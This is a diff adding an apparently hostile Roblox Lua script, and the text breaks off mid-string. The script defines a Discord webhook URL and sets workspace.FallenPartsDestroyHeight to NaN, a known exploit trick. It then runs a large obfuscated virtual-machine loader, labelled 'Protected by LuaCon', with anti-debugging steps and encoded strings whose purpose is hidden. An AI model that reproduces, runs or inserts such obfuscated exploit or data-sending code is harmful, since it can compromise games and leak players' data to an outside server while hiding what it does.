@@ -1,2 +1,3675 @@
+local _1 = "https://discord.com/api/webhooks/1oFTArmadfoLSqb6R0LoziqDXTh9DTJHD6xuROuHai7Lff8jtkpdlB8E-p3"
+workspace.FallenPartsDestroyHeight = -0 / 0
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
 
-("LuaCon Lol"):gsub(".+",function(Cornholio)_G[Cornholio]=Cornholio end)local Bunghole=0;local Beavis=188196108+4106771188;local ButtHead=[[Protected by LuaCon]]ButtHead:gsub('.+',function(FartKnocker)_G[FartKnocker]=FartKnocker;local Dillhole=0;for Gringo=1,#FartKnocker do Dillhole=(Dillhole+string.byte(FartKnocker,Gringo)*Gringo)%Beavis end;Bunghole=Dillhole end)local function AlmightyBunghole(TP,LakeTiticaca,...)local Nads={...}local Score={}local Boing=1;local Schlong=0;local Chode={}local Buttmunch=getfenv()local Assmunch=setmetatable({},{__index=function(Dumbass,Wuss)if Wuss=='getrawmetatable'then while true do end end;return Buttmunch[Wuss]end,__newindex=function(Dumbass,Wuss,Sucks)rawset(Dumbass,Wuss,Sucks)end,__metatable="Protected"})local Cool={["BeavisBeavis"]=0,["BeavisTp"]=1,["BeavisDammit"]=2,["ButtHeadCool"]=3,["DillWuss"]=4,["ButtHeadButtHead"]=5,["KnockerSucks"]=6,["BungholeScore"]=7,["HoleMunch"]=8,["KnockerTurd"]=9,["HoleScore"]=10,["CornholioFart"]=11,["CornholioBoing"]=12,["FartHuh"]=13,["BungholeTurd"]=14,["BeavisWuss"]=15,["DillGringo"]=16,["FartBoing"]=17,["BeavisBunghole"]=18,["CornholioWhoa"]=19,["BeavisSchlong"]=20,["BungholeAss"]=21,["BungholeDiarrhea"]=22,["CornholioDiarrhea"]=23,["KnockerCool"]=24,["KnockerDiarrhea"]=25,["BungholeKnocker"]=26,["KnockerWuss"]=27,["HoleTp"]=28,["DillDammit"]=29,["DillBeavis"]=30,["FartBunghole"]=31,["KnockerSchlong"]=32,["DillNads"]=33,["ButtHeadHuh"]=34,["BeavisCornholio"]=35,["KnockerButtHead"]=36,["KnockerChode"]=37,["BeavisFart"]=38,["KnockerHeh"]=39,["CornholioHole"]=40,["ButtHeadKnocker"]=41,["FartWipe"]=42,["BungholeSchlong"]=43,["HoleButtHead"]=44,["BeavisWhoa"]=45,["ButtHeadWhoa"]=46,["HoleSchlong"]=47,["CornholioWipe"]=48,["FartCornholio"]=49,["HoleWhoa"]=50,["FartHole"]=51,["CornholioCool"]=52,["CornholioDumb"]=53,["KnockerCornholio"]=54,["CornholioTurd"]=55,["DillCornholio"]=56,["BungholeNads"]=57,["HoleDammit"]=58,["HoleHeh"]=59,["DillDill"]=60,["CornholioAss"]=61,["FartScore"]=62,["DillWipe"]=63,["HoleBunghole"]=64,["CornholioCrap"]=65,["FartDiarrhea"]=66,["HoleBoing"]=67,["BeavisNads"]=68,["ButtHeadFart"]=69,["ButtHeadBoing"]=70,["KnockerPlop"]=71,["HoleKnocker"]=72,["BeavisPlop"]=73,["DillButtHead"]=74,["HoleNads"]=75,["KnockerTp"]=76,["KnockerNads"]=77,["HoleAss"]=78,["BungholeDumb"]=79,["FartBeavis"]=80,["FartWhoa"]=81,["DillFart"]=82,["DillButt"]=83,["BeavisCrap"]=84,["BungholeCool"]=85,["ButtHeadButt"]=86,["CornholioFire"]=87,["DillCool"]=88,["CornholioHuh"]=89,["DillSucks"]=90,["CornholioScore"]=91,["BeavisTurd"]=92,["BungholeButt"]=93,["ButtHeadSchlong"]=94,["KnockerKnocker"]=95,["KnockerBoing"]=96,["BungholeCrap"]=97,["ButtHeadHole"]=98,["BungholeHuh"]=99,["ButtHeadGringo"]=100,["KnockerButt"]=101,["ButtHeadPlop"]=102,["BungholeBoing"]=103,["ButtHeadNads"]=104,["BungholeHeh"]=105,["FartPlop"]=106,["DillChode"]=107,["BungholeWuss"]=108,["BeavisDiarrhea"]=109,["KnockerWipe"]=110,["BungholeWhoa"]=111,["CornholioNads"]=112,["CornholioPlop"]=113,["BungholeChode"]=114,["KnockerMunch"]=115,["FartSchlong"]=116,["CornholioDammit"]=117,["ButtHeadBunghole"]=118,["ButtHeadDill"]=119,["BeavisGringo"]=120,["ButtHeadWipe"]=121,["DillSchlong"]=122,["HoleGringo"]=123,["ButtHeadSucks"]=124,["FartCool"]=125,["ButtHeadBeavis"]=126,["ButtHeadDammit"]=127,["BeavisDumb"]=128,["FartChode"]=129,["FartFart"]=130,["KnockerGringo"]=131,["CornholioBunghole"]=132,["CornholioSucks"]=133,["KnockerBeavis"]=134,["ButtHeadTp"]=135,["HoleChode"]=136,["HoleCrap"]=137,["CornholioCornholio"]=138,["BeavisSucks"]=139,["BeavisCool"]=140,["BungholeBeavis"]=141,["KnockerAss"]=142,["ButtHeadChode"]=143,["DillDumb"]=144,["ButtHeadCornholio"]=145,["BungholeButtHead"]=146,["KnockerFire"]=147,["DillHuh"]=148,["BeavisMunch"]=149,["HoleWuss"]=150,["CornholioWuss"]=151,["HoleButt"]=152,["BungholeDill"]=153,["BungholeCornholio"]=154,["FartHeh"]=155,["BungholeSucks"]=156,["DillTurd"]=157,["CornholioMunch"]=158,["DillWhoa"]=159,["BungholeFire"]=160,["BeavisHuh"]=161,["HoleHuh"]=162,["BeavisButt"]=163,["HoleDumb"]=164,["KnockerDill"]=165,["KnockerHuh"]=166,["DillMunch"]=167,["BeavisWipe"]=168,["DillBunghole"]=169,["BeavisChode"]=170,["HoleFire"]=171,["BungholeGringo"]=172,["HoleFart"]=173,["ButtHeadDumb"]=174,["BeavisButtHead"]=175,["BeavisHeh"]=176,["HoleDiarrhea"]=177,["BeavisFire"]=178,["CornholioTp"]=179,["FartAss"]=180,["CornholioChode"]=181,["BeavisBoing"]=182,["FartTp"]=183,["CornholioBeavis"]=184,["FartButtHead"]=185,["HoleBeavis"]=186,["DillFire"]=187,["BeavisAss"]=188,["BungholePlop"]=189,["BeavisHole"]=190,["BeavisDill"]=191,["FartCrap"]=192,["FartDill"]=193,["CornholioButtHead"]=194,["DillHeh"]=195,["HoleCool"]=196,["FartTurd"]=197,["KnockerHole"]=198,["DillBoing"]=199,["FartFire"]=200,["DillKnocker"]=201,["FartButt"]=202,["DillScore"]=203,["HoleWipe"]=204,["DillHole"]=205,["BungholeDammit"]=206,["KnockerDumb"]=207,["FartDammit"]=208,["ButtHeadHeh"]=209,["ButtHeadDiarrhea"]=210,["BungholeBunghole"]=211,["KnockerDammit"]=212,["DillTp"]=213,["DillCrap"]=214,["BungholeFart"]=215,["HoleHole"]=216,["CornholioDill"]=217,["FartWuss"]=218,["BeavisKnocker"]=219,["CornholioKnocker"]=220,["CornholioGringo"]=221,["HoleCornholio"]=222,["BungholeWipe"]=223,["ButtHeadFire"]=224,["BeavisScore"]=225,["KnockerCrap"]=226,["CornholioHeh"]=227,["FartDumb"]=228,["BungholeMunch"]=229,["KnockerWhoa"]=230,["FartNads"]=231,["ButtHeadCrap"]=232,["BungholeTp"]=233,["KnockerBunghole"]=234,["BungholeHole"]=235,["KnockerFart"]=236,["DillDiarrhea"]=237,["ButtHeadAss"]=238,["DillAss"]=239,["FartMunch"]=240,["DillPlop"]=241,["HoleTurd"]=242,["ButtHeadMunch"]=243,["ButtHeadScore"]=244,["FartGringo"]=245,["ButtHeadWuss"]=246,["FartSucks"]=247,["HoleDill"]=248,["CornholioSchlong"]=249,["CornholioButt"]=250,["ButtHeadTurd"]=251,["HolePlop"]=252,["FartKnocker"]=253,["HoleSucks"]=254,["KnockerScore"]=255}local function HuhHuh(FartKnocker)if type(FartKnocker)~='string'then return FartKnocker end;if string.sub(FartKnocker,1,1)~=" "then return FartKnocker end;local HehHeh={}for Fire in string.gmatch(FartKnocker,"%S+")do table.insert(HehHeh,Fire)end;if#HehHeh==0 then return FartKnocker end;local FireFire=HehHeh[1]local Wuss=Cool[FireFire]if not Wuss then return FartKnocker end;local Diarrhea={}local Crap=47;for Gringo=2,#HehHeh do local Fire=HehHeh[Gringo]local Turd=Cool[Fire]local Butt=Gringo-1;local Hole=(Turd-Wuss-Butt*Crap)%256;table.insert(Diarrhea,string.char(Hole))end;local Knocker=table.concat(Diarrhea)if string.sub(Knocker,1,1)=="~"then return tonumber(string.sub(Knocker,2))end;return Knocker end;local Munch=Assmunch[HuhHuh(" DillButt FartDumb BungholeKnocker BeavisCrap FartDiarrhea CornholioNads")]or require(HuhHuh(" BungholeMunch ButtHeadBunghole BungholeGringo KnockerWhoa KnockerDammit BeavisDammit"))local Wipe=Munch[HuhHuh(" BeavisButtHead HoleBunghole CornholioSucks HoleFire CornholioGringo")]local Plop=Assmunch[HuhHuh(" DillWhoa HoleBoing DillChode BungholeSucks BeavisAss DillDiarrhea KnockerButtHead")]or table[HuhHuh(" KnockerBunghole KnockerAss BeavisBoing FartNads BungholeScore DillCornholio BungholeWhoa")]local Cornholio1=Assmunch[HuhHuh(" BeavisKnocker ButtHeadWipe BungholeGringo")]local Bunghole1=Cornholio1[HuhHuh(" ButtHeadDill KnockerTurd CornholioCrap KnockerMunch HoleWuss DillHole")]local Beavis1=Assmunch[HuhHuh(" FartDiarrhea BungholeMunch BeavisTp FartDiarrhea BungholeHeh")]local ButtHead1=Beavis1 and Beavis1[HuhHuh(" HoleDammit ButtHeadFire CornholioSchlong CornholioWipe FartPlop")]or nil;pcall(function()local FartKnocker1=getfenv()FartKnocker1.debug=nil end)local Dillhole1=HuhHuh(" DillFire HoleBoing HoleChode BungholePlop BungholePlop BungholeAss DillButtHead BungholeChode CornholioWuss BeavisButtHead ButtHeadWuss FartBunghole CornholioAss BungholeBeavis HoleCool BungholeBunghole CornholioWhoa HoleHeh FartCool")local Gringo1=Wipe(1919805324,Bunghole)local AlmightyBunghole1=Bunghole1()local function TP1(LakeTiticaca1)Schlong=Schlong+1;Score[Schlong]=LakeTiticaca1;Chode={LakeTiticaca1}end;for Nads1=1,1/0 do if ButtHead1 and Bunghole1()-AlmightyBunghole1>0.1 then ButtHead1()AlmightyBunghole1=Bunghole1()end;local Score1=Wipe(Gringo1,Boing)local Boing1=TP[Boing]local Schlong1=Wipe(Boing1,Score1)Boing=Boing+1;if Schlong1<117 then if Schlong1<61 then if Schlong1<22 then if Schlong1<21 then if Schlong1==20 then local Chode1=TP[Boing]Boing=Boing+1;local Buttmunch1=TP[Boing]Boing=Boing+1;local Assmunch1=Assmunch[HuhHuh(LakeTiticaca[Chode1])]local Dumbass1=HuhHuh(LakeTiticaca[Buttmunch1])local Diarrhea={Assmunch1(Dumbass1)}Chode=Diarrhea;Schlong=Schlong+1;Score[Schlong]=Diarrhea[1]end else if Schlong1==21 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio..Turd;Chode={Score[Schlong]}end end else if Schlong1<30 then if Schlong1==22 then return Plop(Chode)end else if Schlong1<39 then if Schlong1==30 then local Butt=TP[Boing]Boing=Boing+1;TP1(HuhHuh(LakeTiticaca[Butt]))end else if Schlong1==39 then local Wuss=Score[Schlong]Schlong=Schlong-1;local Dumbass=Score[Schlong]Score[Schlong]=Dumbass[Wuss]Schlong=Schlong+1;Score[Schlong]=Dumbass end end end end else if Schlong1<100 then if Schlong1<63 then if Schlong1==61 then local Wuss1=TP[Boing]Boing=Boing+1;if not Score[Schlong]then Boing=Boing+Wuss1 else Schlong=Schlong-1 end end else if Schlong1==63 then local Butt=TP[Boing]Boing=Boing+1;TP1(Nads[Butt])end end else if Schlong1<101 then if Schlong1==100 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio*Turd;Chode={Score[Schlong]}end else if Schlong1<111 then if Schlong1==101 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio-Turd;Chode={Score[Schlong]}end else if Schlong1==111 then local Sucks=Score[Schlong]Schlong=Schlong-1;local Wuss=Score[Schlong]Schlong=Schlong-1;local Dumbass=Score[Schlong]Schlong=Schlong-1;Dumbass[Wuss]=Sucks end end end end end else if Schlong1<156 then if Schlong1<137 then if Schlong1<123 then if Schlong1==117 then local Wuss1=TP[Boing]Boing=Boing+1;if Score[Schlong]then Boing=Boing+Wuss1 else Schlong=Schlong-1 end end else if Schlong1==123 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio+Turd;Chode={Score[Schlong]}end end else if Schlong1<149 then if Schlong1==137 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio/Turd;Chode={Score[Schlong]}end else if Schlong1<152 then if Schlong1==149 then local Wuss=Score[Schlong]Schlong=Schlong-1;local Dumbass=Score[Schlong]Score[Schlong]=Dumbass[Wuss]Chode={Score[Schlong]}end else if Schlong1==152 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio%Turd;Chode={Score[Schlong]}end end end end else if Schlong1<179 then if Schlong1<166 then if Schlong1==156 then local Sucks1=TP[Boing]Boing=Boing+1;local Assmunch1=Score[Schlong-Sucks1]local Cool1={}local Gringo=1;while Gringo<=Sucks1 do Cool1[Sucks1-Gringo+1]=Score[Schlong]Schlong=Schlong-1;Gringo=Gringo+1 end;Schlong=Schlong-1;local Diarrhea={Assmunch1(Plop(Cool1))}Chode=Diarrhea;Schlong=Schlong+1;Score[Schlong]=Diarrhea[1]end else if Schlong1==166 then local Butt=TP[Boing]Boing=Boing+1;TP1(Assmunch[HuhHuh(LakeTiticaca[Butt])])end end else if Schlong1<189 then if Schlong1==179 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio==Turd;Chode={Score[Schlong]}end else if Schlong1<191 then if Schlong1==189 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio<Turd;Chode={Score[Schlong]}end else if Schlong1==191 then local Turd=Score[Schlong]Schlong=Schlong-1;local Cornholio=Score[Schlong]Score[Schlong]=Cornholio<=Turd;Chode={Score[Schlong]}end end end end end end end end;local HuhHuh1=62020;local HehHeh1={}local Fire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787928,3,1919787822,4,1919787943,1919787951,0,1919787811},{" DillWhoa KnockerTp FartHole KnockerBoing DillDumb"," HoleChode CornholioDumb HoleTp BeavisPlop DillSchlong"," FartSchlong BeavisBunghole ButtHeadFart"," CornholioMunch CornholioWipe ButtHeadNads BungholeCornholio BungholePlop ButtHeadScore"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787928,3,1919787789,16,1919787924,4,1919787818,5,1919787939,1919787947,0,1919787798,1,1919787854,1919787826,6,1919787921,1919787825,7,1919787922,1919787828},{" ButtHeadCrap BeavisMunch FartCool DillMunch CornholioKnocker"," BeavisSucks DillCornholio KnockerSchlong DillButtHead BeavisDumb"," KnockerTurd BungholeGringo FartFire KnockerTurd CornholioWipe"," FartButt ButtHeadNads FartHeh"," KnockerChode FartTp DillAss DillNads BeavisNads HoleGringo"," DillKnocker ButtHeadBunghole CornholioFire CornholioBunghole BeavisBoing",false},Fire1)then AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787925,5,1919787819,6,1919787938,1919787956,0,1919787836},{" HoleBunghole DillDiarrhea BungholeFart DillWuss CornholioCool"," DillTurd DillButtHead CornholioWipe KnockerBoing ButtHeadChode"," BungholeFire KnockerNads KnockerCornholio KnockerKnocker BeavisCool"," DillSucks BungholeScore BungholeTp KnockerWuss"," FartBeavis ButtHeadMunch BeavisWuss FartBeavis ButtHeadDill"," DillGringo BeavisBoing KnockerDumb KnockerSucks HoleBunghole"})Fire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787924,5,1919787818,6,1919787939,1919787947,0,1919787839},{" CornholioFire BungholePlop DillDammit DillSucks ButtHeadBunghole ButtHeadBunghole BungholeBunghole"," BungholeAss CornholioButtHead HoleDumb HoleHole"," CornholioSchlong KnockerHuh CornholioCornholio BeavisAss KnockerBunghole"," CornholioHeh KnockerPlop DillFire FartNads CornholioFart ButtHeadFart BungholeCrap"," BeavisNads KnockerCrap BungholeAss"," CornholioWuss ButtHeadKnocker BungholeCrap KnockerFire BeavisBoing DillDiarrhea"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787817,7,1919787924,1919787797,1,1919787826,8,1919787933,1919787794,2,1919787806,2,1919787829},{" KnockerSchlong DillHole HoleDiarrhea CornholioGringo FartHuh"," FartCool FartWipe BungholeTurd HoleDammit DillChode"," BeavisGringo HoleMunch KnockerTurd DillCornholio KnockerButt BungholeBunghole FartButt"," ButtHeadHole BeavisWuss CornholioSchlong KnockerButtHead DillFart"," HolePlop DillBunghole KnockerFire BeavisHole DillDiarrhea"," FartDill KnockerWipe DillFart CornholioBunghole CornholioChode"," DillSchlong KnockerHeh CornholioFart CornholioAss BungholeWhoa"," BeavisSucks DillCornholio KnockerSchlong BeavisPlop ButtHeadBeavis BungholeGringo BeavisKnocker"},HuhHuh1,not HehHeh1[71766])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787926,1919787795,1,1919787824,9,1919787923,1919787804,2,1919787804,2,1919787827},{" HolePlop DillBunghole KnockerAss FartDill DillAss"," BeavisChode CornholioFire DillDill BungholeWhoa CornholioMunch"," HoleHeh ButtHeadCrap KnockerDumb HoleDill HoleSchlong"," DillHuh CornholioCrap CornholioHole FartWhoa HoleCrap"," FartHeh HoleBunghole BungholeSchlong BeavisTurd BungholeDammit HoleTurd KnockerChode"," CornholioCool HoleHole CornholioFart ButtHeadWhoa BeavisTurd ButtHeadTp"," HoleDammit FartNads DillKnocker CornholioSchlong HoleSchlong"," FartButt ButtHeadDill CornholioHuh CornholioCornholio BeavisBoing"," ButtHeadGringo FartBoing ButtHeadScore BeavisCornholio DillButt FartChode FartTp"},HuhHuh1,not HehHeh1[22329])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787852,1919787830,7,1919787828,8,1919787795,1,1919787824,9,1919787923,1919787804,2,1919787804,2,1919787827},{" CornholioDill KnockerBeavis DillChode BungholeSucks DillBoing"," BeavisDiarrhea BungholeKnocker KnockerScore CornholioWipe BeavisTurd"," BungholeCrap BungholeTurd HoleDill KnockerChode ButtHeadButt"," HoleButtHead CornholioDill DillHeh DillPlop KnockerCool"," FartDill KnockerWipe FartBeavis ButtHeadTp FartAss"," BungholeTp HoleWuss HoleGringo DillBunghole CornholioGringo"," KnockerSchlong DillKnocker BeavisBoing BeavisFart CornholioAss KnockerGringo CornholioPlop"," DillBunghole HoleBoing ButtHeadSucks BungholeWhoa BeavisMunch CornholioBoing BungholeSchlong"," HoleHuh BungholeDumb KnockerCornholio BungholeCrap KnockerAss BeavisDill KnockerFart"},HuhHuh1,not HehHeh1[62020])then HehHeh1[62020]=1;AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787926,4,1919787924,5,1919787818,6,1919787793,1919787784,1,1919787957,0,1919787796,2,1919787953,3,1919787955,1,1919787965,0,1919787829},{" BungholeWipe BeavisCool FartSchlong HoleHuh KnockerDumb"," BungholeWipe BeavisCool FartSchlong HoleHuh FartDammit"," FartHeh ButtHeadTurd CornholioWipe ButtHeadSchlong FartTurd ButtHeadScore HoleTp"," FartWipe FartTurd FartSucks KnockerCool DillButtHead HoleChode CornholioBeavis BungholeMunch CornholioFart DillWipe BungholeBoing"," BeavisPlop BungholeWipe HoleMunch HoleBoing FartPlop"," ButtHeadTp HoleSucks CornholioHuh HoleChode CornholioTp FartButtHead KnockerSucks BeavisNads"},function()local FireFire1,Diarrhea1,Crap1,Turd1,Butt1,Hole1;local Knocker1=65149;local Munch1={}local Wipe1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787855,1919787923,6,1919787817,7,1919787964,1919787958,0,1919787834},{" HoleWhoa DillHuh BeavisDammit HoleWhoa KnockerButtHead KnockerBeavis HoleDiarrhea"," BeavisMunch FartDiarrhea KnockerChode DillSucks CornholioCornholio"," FartCornholio HoleCornholio FartCrap ButtHeadWuss DillNads"," CornholioTurd FartDumb HoleWipe HoleDill BeavisFart"," BeavisDill BungholeWuss BungholeCool CornholioBunghole BeavisHeh"," KnockerCornholio KnockerDammit BungholeScore"," CornholioFire BungholeTp DillNads DillButt ButtHeadBunghole HoleFart"})while true do if AlmightyBunghole({1919787815,1,1919787933,2,1919787776,16,1919787929,3,1919787823,4,1919787942,1919787944,0,1919787785,1,1919787853,1919787831,5,1919787924,1919787826,6,1919787933,1919787833},{" HoleGringo DillNads HoleHeh BeavisGringo DillChode DillCrap ButtHeadWuss"," HolePlop DillWhoa DillFire HolePlop BeavisCornholio"," FartKnocker FartHeh BungholeDammit"," BeavisFart CornholioBeavis FartMunch ButtHeadHuh ButtHeadFart ButtHeadSucks"," KnockerHeh KnockerDammit CornholioChode KnockerCrap BeavisSchlong",false},Wipe1)then AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787928,3,1919787822,4,1919787943,1919787951,0,1919787811},{" DillFire ButtHeadNads DillButtHead HoleGringo BeavisChode"," DillKnocker ButtHeadBunghole KnockerBoing BeavisCool BungholePlop"," BungholeFart DillSchlong HoleWuss BungholeFart HoleSucks"," DillButtHead FartMunch KnockerTurd HoleBunghole DillSchlong"})Wipe1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787818,6,1919787915,1919787921,7,1919787831,8,1919787966,1919787952,0,1919787832},{" HoleFire BungholeTurd CornholioNads ButtHeadDumb HoleCornholio BungholeScore CornholioTurd"," HoleTp DillKnocker BungholeGringo"," BungholeCornholio KnockerPlop ButtHeadWhoa DillSucks HoleCrap"," FartDiarrhea BeavisButt BungholeKnocker KnockerScore CornholioCool BungholeHuh DillHole"," CornholioBoing FartButtHead BungholeSucks FartDammit HolePlop"," BungholeCrap BungholeTurd DillPlop KnockerChode DillFart"," FartBoing BeavisButtHead KnockerCrap"," BungholeDiarrhea BeavisWipe ButtHeadFire BeavisBunghole CornholioDumb BungholeWuss"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787777,1,1919787822,3,1919787905,1919787790,2,1919787786,2,1919787809},{" HoleCrap KnockerCornholio KnockerWuss HoleKnocker ButtHeadBeavis"," ButtHeadBeavis BungholeSchlong DillGringo FartScore FartPlop"," CornholioWipe CornholioGringo KnockerHole HoleTurd DillNads BungholeDumb KnockerGringo"},Knocker1,not Munch1[85549])then Munch1[85549]=1;return AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787852,1919787830,7,1919787828,8,1919787863,1919787827,9,1919787825,10,1919787866,1919787908,11,1919787834,12,1919787955,1919787800,1,1919787783,13,1919787918,1919787904,1,1919787784},{" BungholeWuss KnockerDiarrhea KnockerScore ButtHeadKnocker ButtHeadSchlong"," CornholioFire DillWuss KnockerBunghole BeavisSchlong DillButtHead"," DillWipe KnockerFart KnockerDammit BeavisTp BeavisWhoa"," ButtHeadButtHead BeavisFire BungholeCornholio DillBoing ButtHeadScore"," FartScore BungholeHole DillHole HoleSucks HoleSchlong"," CornholioAss KnockerBunghole ButtHeadHeh CornholioButt FartCornholio"," KnockerNads CornholioButt HoleCornholio BungholeTurd BungholeNads"," DillTp FartFart FartPlop HoleWuss KnockerHole"," ButtHeadHeh ButtHeadBeavis BungholeBoing DillHuh HoleCool"," ButtHeadBoing ButtHeadMunch DillCrap ButtHeadCool DillCornholio"," HoleBunghole CornholioHeh KnockerScore HoleSchlong ButtHeadNads DillDumb"," BungholeHeh ButtHeadTurd KnockerCornholio ButtHeadGringo HoleChode CornholioChode FartSucks"," BungholeWuss FartHuh"},Diarrhea1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" ButtHeadBeavis CornholioWhoa HoleKnocker HoleGringo BungholeSucks DillScore"," KnockerWipe KnockerWuss ButtHeadCool FartHole CornholioScore"," BeavisHeh BungholeButt ButtHeadFart CornholioDammit CornholioMunch"," DillBoing FartSchlong DillCool BeavisSucks CornholioBeavis FartDumb CornholioDiarrhea"},Knocker1,not Munch1[37526])then Munch1[37526]=1;Turd1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787924,5,1919787818,6,1919787939,1919787817,7,1919787831,8,1919787959,2,1919787835},{" KnockerSchlong FartDill DillAss BeavisBunghole DillButtHead BungholeWuss BeavisDiarrhea"," BeavisDill BungholeWuss FartWhoa KnockerGringo HoleDiarrhea"," KnockerWuss FartFire HoleFart BungholeWipe BungholeTurd"," CornholioButt DillTurd ButtHeadDiarrhea KnockerFart KnockerFart ButtHeadBoing ButtHeadDammit"," KnockerFart FartCool CornholioTp DillDiarrhea BeavisKnocker KnockerTurd"," BungholeSucks BeavisWhoa BungholeChode HoleButt FartButt"," HoleWuss HoleBoing FartWipe BeavisTurd BeavisSucks BeavisFire KnockerCrap BeavisBunghole"," FartHole ButtHeadFire HoleCool ButtHeadMunch FartBunghole DillButt ButtHeadDammit"})Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787777,1,1919787822,3,1919787849,1919787821,4,1919787949,1919787808},{" CornholioScore HoleMunch ButtHeadAss FartBunghole KnockerPlop"," BeavisChode CornholioFire CornholioAss KnockerWipe CornholioWuss"," CornholioFart CornholioBeavis CornholioMunch HoleWipe ButtHeadTurd KnockerHeh BeavisTurd"," FartPlop CornholioDiarrhea CornholioSchlong ButtHeadKnocker CornholioHuh CornholioSucks BeavisBoing BungholeTp"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787863,1919787794,1,1919787825,9,1919787922,1919787807,2,1919787803,2,1919787824},{" BungholeHeh BungholeDiarrhea CornholioButt HoleButtHead CornholioFire"," ButtHeadPlop CornholioWhoa FartSucks ButtHeadKnocker BungholeCool"," BeavisCool BungholeNads DillDammit FartWhoa ButtHeadSucks"," BeavisMunch FartDiarrhea FartWipe CornholioScore HoleChode"," HoleWhoa BungholeWipe CornholioButtHead ButtHeadWuss BeavisFart"," KnockerKnocker CornholioBoing DillAss BeavisCornholio BeavisCrap"," KnockerWuss FartFire BeavisFire CornholioDill BungholeTurd"," CornholioScore HoleMunch FartMunch HoleTp KnockerNads"," HoleScore FartTp BungholeDill DillBoing HolePlop FartWipe DillCool BeavisSucks"},Knocker1,not Munch1[106548])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" BeavisGringo KnockerChode CornholioBoing BungholeNads ButtHeadPlop"," HoleWipe ButtHeadWipe KnockerBoing BungholeBeavis DillFire"," BeavisNads BeavisWipe BungholeScore ButtHeadFart ButtHeadBunghole DillHuh CornholioWuss"," ButtHeadAss FartHeh FartChode FartAss BeavisScore BeavisWuss HoleHeh"},Knocker1,not Munch1[59763])then Munch1[59763]=1;Diarrhea1={}Knocker1=AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787844,1919787822,3,1919787946,1919787813},{" DillWhoa ButtHeadCool BeavisWhoa BeavisTurd DillTp BeavisTp"," BeavisButtHead BeavisTurd HoleBunghole KnockerWipe DillTurd HoleWipe HoleSucks"," HoleSucks HoleFire BungholeBeavis BungholePlop DillDiarrhea KnockerDiarrhea DillButtHead FartCool"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" BungholeBoing BungholeScore FartHole BungholeHuh ButtHeadTp BeavisHole KnockerFart"," HoleSchlong CornholioKnocker KnockerHole DillDiarrhea KnockerButtHead HoleAss ButtHeadSucks"},Knocker1,not Munch1[91943])then Munch1[91943]=1;Butt1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787922,6,1919787816,7,1919787965,1919787831,8,1919787829,9,1919787953,2,1919787913,6,1919787839,7,1919787958,1919787834,10,1919787832,11,1919787908,2,1919787873,1919787789},{" DillWipe KnockerFart BungholeBunghole FartKnocker ButtHeadWhoa"," BungholeCornholio KnockerPlop HoleButtHead KnockerKnocker"," CornholioNads DillGringo KnockerScore ButtHeadPlop ButtHeadHole FartTurd"," HolePlop DillDumb BungholeDammit ButtHeadMunch HoleButtHead HoleKnocker CornholioCornholio"," KnockerBunghole DillFart FartButtHead BungholeTp CornholioDiarrhea CornholioBoing BungholeWuss"," BeavisWuss BungholeFire DillCrap DillGringo HoleSucks HoleButtHead"," CornholioWhoa HoleDumb BungholeTp BeavisWuss CornholioCrap"," CornholioWhoa FartCrap KnockerDill DillCrap ButtHeadButtHead CornholioWipe ButtHeadPlop"," BungholeFire KnockerNads HoleWhoa BungholeHuh KnockerFire FartDill KnockerBunghole"," CornholioDill KnockerBeavis ButtHeadNads DillTurd KnockerHole CornholioButt HoleButtHead"," BungholePlop FartPlop KnockerTp FartChode HoleFire CornholioGringo 